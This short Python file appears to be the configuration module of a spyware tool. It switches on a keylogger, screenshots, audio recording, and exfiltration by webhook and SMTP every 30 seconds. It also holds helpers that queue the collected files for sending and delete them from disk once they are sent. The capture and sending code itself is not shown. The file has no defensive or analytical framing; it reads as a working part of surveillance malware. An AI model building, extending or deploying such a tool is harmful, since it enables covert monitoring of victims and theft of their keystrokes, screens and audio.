import os

_OUTPUT_FOLDER = "outputFiles"
os.makedirs(_OUTPUT_FOLDER, exist_ok=True)

ENABLE_KEYLOGGER = True
ENABLE_SCREENSHOT = True
ENABLE_RECORDING = True
ENABLE_WEBHOOK = True
ENABLE_SMTP_TRANSFER = True

TRANSMISSION_INTERVAL = 30
RECORDING_TIME = 25
_collected_files = []

WEBHOOK_URL = ""


def cfg_output_folder():
    return _OUTPUT_FOLDER


def cfg_add2files(file):
    if file not in _collected_files:
        _collected_files.append(file)


def cfg_get_files2send():
    return _collected_files


def cfg_clear_files2send():
    _collected_files.clear()


def cfg_cleanup_sent_files(files):
    sent_files = set(files)
    _collected_files[:] = [item for item in _collected_files if item not in sent_files]

    for file in sent_files:
        if os.path.isfile(file):
            os.remove(file)
            # print(f"Removed: {file}")
        else:
            print(f"File not found: {file}")
